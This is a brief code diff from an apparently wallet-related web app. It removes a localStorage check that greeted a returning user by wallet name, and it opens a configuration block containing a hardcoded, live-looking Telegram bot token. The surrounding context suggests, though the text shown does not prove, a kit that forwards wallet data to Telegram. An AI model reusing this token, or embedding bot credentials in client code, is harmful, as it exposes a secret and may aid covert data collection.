@@ -2,15 +2,6 @@ if (!window.matchMedia('(display-mode: standalone)') .matches) {
 window. location.href = 'index.html';
 }
 
-//Check if status is completed
-let targetValue = 'completed';
-let storedValue = localStorage.getItem('status');
-
-if (storedValue === targetValue) {
-    alert(`Welcome Back ${walletName}!`);
-        window.location.href = 'home.html';
-}
-
 document.addEventListener('DOMContentLoaded', function() {
 // Configuration
     const Usertoken = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y';
